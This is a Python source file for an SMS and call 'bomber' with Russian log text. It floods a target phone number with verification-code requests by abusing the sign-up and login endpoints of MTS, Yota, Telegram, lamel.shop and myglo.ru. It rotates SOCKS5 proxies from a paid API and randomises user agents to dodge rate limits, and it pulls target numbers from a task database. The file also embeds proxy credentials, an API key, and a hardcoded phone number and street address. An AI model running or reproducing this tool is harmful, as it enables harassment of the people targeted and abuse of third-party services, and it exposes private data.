from bs4 import BeautifulSoup
import sqlite3
import threading
import time
import requests
from fake_useragent import UserAgent
from loguru import logger
import coloredlogs
import verboselogs
import sys
from random import choice

level_styles = {
    "debug": {"color": 8},
    "info": {},
    "warning": {"color": 11},
    "error": {"color": "red"},
    "critical": {"bold": True, "color": "red"},
    "spam": {"color": "green", "faint": True},
    "verbose": {"color": "blue"},
    "notice": {"color": "magenta"},
    "success": {"bold": True, "color": "green"},
}

logfmtstr = "%(asctime)s,%(msecs)03d %(name)s %(levelname)s %(message)s"
logfmt = coloredlogs.ColoredFormatter(logfmtstr, level_styles=level_styles)

logger = verboselogs.VerboseLogger("Benefix")

coloredlogs.install(
    fmt=logfmtstr,
    stream=sys.stdout,
    level_styles=level_styles,
    milliseconds=True,
    level="DEBUG",
    logger=logger,
)

# 81.177.27.198:11181:LtgGd1:6qL88p
# 81.177.27.198:11180:LtgGd1:6qL88p
# 81.177.27.198:11179:LtgGd1:6qL88p
# 81.177.27.198:11178:LtgGd1:6qL88p
# 81.177.27.198:11177:LtgGd1:6qL88p
# 81.177.27.198:11176:LtgGd1:6qL88p
# 81.177.27.198:11175:LtgGd1:6qL88p
# 81.177.27.198:11174:LtgGd1:6qL88p
# 81.177.27.198:11173:LtgGd1:6qL88p
# 81.177.27.198:11172:LtgGd1:6qL88p

class Bomber:
    def __init__(self, phone, WorkTime, ID):
        self.phone = phone
        self.phone_plus = "+" + phone
        self.phone_parentheses = f"{phone[0]} ({phone[1]}{phone[2]}{phone[3]}) {phone[4]}{phone[5]}{phone[6]}-{phone[7]}{phone[8]}-{phone[9]}{phone[10]}"

        self.path_db = "database.db"
        self.WorkTime = WorkTime
        self.ID = ID
        self.Flag = True

        self.services = [self.pomogatel]
        # self.services = [self.mts, self.telegram, self.yota]


        self.url = "https://api.good-proxies.ru/get.php?type%5Bsocks5%5D=on&count=&ping=8000&time=600&works=100&key=06322d18732ced3048b644716832b032"
        self.client = requests.session()

        headers = {
                          "X-Requested-With": "XMLHttpRequest",
                          "Connection": "keep-alive",
                          "Pragma": "no-cache",
                          "Cache-Control": "no-cache",
                          "Accept-Encoding": "gzip, deflate, br",
                          "User-Agent": UserAgent().chrome,
                          "DNT": "1",
          }

        self.client.headers.update(headers)

    def launch(self):
        try:

            threading.Thread(target=self.timer).start()
            threading.Thread(target=self.shutdown).start()
            threading.Thread(target=self.FindProxy).start()

            for i in range(20):
                threading.Thread(target=self.check_proxy).start()

            while True:
                for service in range(30):
                    servic = choice(self.services)
                    time.sleep(1)
                    threading.Thread(target=servic).start()



        except Exception as ex: pass

    def FindProxy(self):
        while True:
            try:
                r = requests.get(self.url)
                with open("proxies.txt", "w", encoding="utf-8") as file: file.write(str(r.text))
                proxylen = str(r.text).split('\n')
                time.sleep(6)
            except Exception as ex:
                time.sleep(2)

    def check_proxy(self):
        while True:
            try:


                with open("proxies.txt", "r", encoding="utf-8") as file:
                    proxy = file.read().split("\n")

                RandomProxy = choice(proxy)


                proxyDict = {
                    "http": "socks5://" + RandomProxy,
                    "https": "socks5://" + RandomProxy,
                }



                self.client.proxies.update(proxyDict)


            except Exception as ex:
                continue

    def Headers(self):
        self.headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "sec-ch-ua": '"Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
            "User-Agent": UserAgent().chrome,
        }

        return self.headers

    def timer(self):
        time.sleep(self.WorkTime)

        self.Flag = False

        with sqlite3.connect(self.path_db) as db:
            db.execute("DELETE FROM tasks WHERE ID = ?", (self.ID,))

        logger.critical(f"Закончил спамить номер по ID: {self.ID}")

    def shutdown(self):
        while True:
            with sqlite3.connect(self.path_db) as db:
                task = db.execute("SELECT * FROM tasks WHERE ID = ?", (self.ID,)).fetchall()

            if len(task) <= 0:
                self.Flag = False

                with sqlite3.connect(self.path_db) as db:
                    db.execute("DELETE FROM tasks WHERE ID = ?", (self.ID,))

                logger.info(f"Закончил спамить номер по ID: {self.ID}")

            else: pass

            time.sleep(50)

    def phone_mask(self, phone, maska):
        str_list = list(phone)
        for xxx in str_list:
            maska = maska.replace("#", xxx, 1)
        return maska

    def mts(self):
        if self.Flag:
            try:
                r = self.client.post(
                    f"https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code/",
                    params={"msisdn": self.phone},
                    headers={
                        "X-Requested-With": "XMLHttpRequest",
                        "Connection": "keep-alive",
                        "Pragma": "no-cache",
                        "Cache-Control": "no-cache",
                        "Accept-Encoding": "gzip, deflate, br",
                        "User-Agent": UserAgent().chrome,
                        "DNT": "1",
                    },
                )

                time.sleep(3)

                r = self.client.post(
                    f"https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
                    params={"msisdn 799": self.phone},
                    headers={
                        "X-Requested-With": "XMLHttpRequest",
                        "Connection": "keep-alive",
                        "Pragma": "no-cache",
                        "Cache-Control": "no-cache",
                        "Accept-Encoding": "gzip, deflate, br",
                        "User-Agent": UserAgent().chrome,
                        "DNT": "1",
                    },
                )


                print(f"[+] MTS")

            except Exception as ex: pass
        else:
            return

    def yota(self):

        if self.Flag:
            try:
                r = self.client.get("https://tv.yota.ru/")
                sesionId = r.cookies["SessionID"]

                r = self.client.post(
                    f"https://bmp.tv.yota.ru/api/v10/auth/register/msisdn",
                    headers={
                        "X-Requested-With": "XMLHttpRequest",
                        "Connection": "keep-alive",
                        "Pragma": "no-cache",
                        "cookie": f"SessionID={sesionId}",
                        "Cache-Control": "no-cache",
                        "Accept-Encoding": "gzip, deflate, br",
                        "User-Agent": UserAgent().chrome,
                        "DNT": "1",
                    },
                    data={"msisdn": self.phone, "password": "123123"},
                )


                print("[+] YOTA")
            except Exception as ex: pass
        else:
            return

    def telegram(self):
        if self.Flag:
            try:

                headers = {
                    "authority": "my.telegram.org",
                    "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "x-requested-with": "XMLHttpRequest",
                    "sec-ch-ua-mobile": "?0",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
                    "sec-ch-ua-platform": '"Windows"',
                    "origin": "https://my.telegram.org",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://my.telegram.org/auth/",
                    "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                }

                data = {"phone": self.phone_plus}

                r = self.client.post(
                    "https://my.telegram.org/auth/send_password",
                    headers=headers,
                    data=data,
                )


                print("[+] TELEGRAM")
            except Exception as ex: pass

    def lamel(self):
        if self.Flag:
            try:

                r = self.client.get("https://lk.lamel.shop/Account/LogOn?ReturnUrl=%2FClientForm%2FWelcomePage")
                token = r.cookies["__RequestVerificationToken"]

                time.sleep(0.2)

                params = {
                    'ReturnUrl': '/ClientForm/WelcomePage',
                }

                data = {
                    '__RequestVerificationToken': token,
                    'CardNumber': '',
                    'PasswordForCardNumber': '',
                    'Phone': self.phone_plus,
                    'PasswordForPhone': '123321asSs',
                    'Login': '\u0412\u043E\u0439\u0442\u0438',
                    'ActionEnter': 'phone',
                    'EnterButtonText': '\u0412\u043E\u0439\u0442\u0438',
                    'CanVirtualRegister': 'True',
                }


                r = self.client.post("https://lk.lamel.shop/Account/LogOn?ReturnUrl=%2FClientForm%2FWelcomePage", data=data, params=params).text
                print(r)



                print("[+] lamel")
            except Exception as ex: print(ex)

    def pomogatel(self):
        try:

            json_data = {
                "address": "Москва, Шоссейная, 68",
                "country": "Россия",
                "house": "68",
                "latitude": "55.672727",
                "locality": "Москва",
                "longitude": "37.71989",
                "phoneNumber": "9388954250",
                "phoneNumberMasked": "+7(938)895-42-50",
                "roleId": "2",
                "specializationId": "32",
                "street": "Шоссейная улица",
                "type": "phone"
            }


            r = self.client.post("https://www.myglo.ru/glo_sms_auth/account/sendCode",data=json_data, cert=False).json()
            print(r)


        except Exception as ex: print(ex)

bomber = Bomber("79388954250", 500, 555).launch()

def main():

    while True:

        with sqlite3.connect("database.db") as db:
            tasks = db.execute("SELECT * FROM tasks").fetchall()

        for task in tasks:

            with sqlite3.connect("database.db") as db:
                db.execute("UPDATE tasks SET active = ? WHERE ID = ?", ("False", task[0]))

            Bomber(task[5], task[3], task[0]).launch()


        time.sleep(5)


if __name__ == "__main__":
    main()









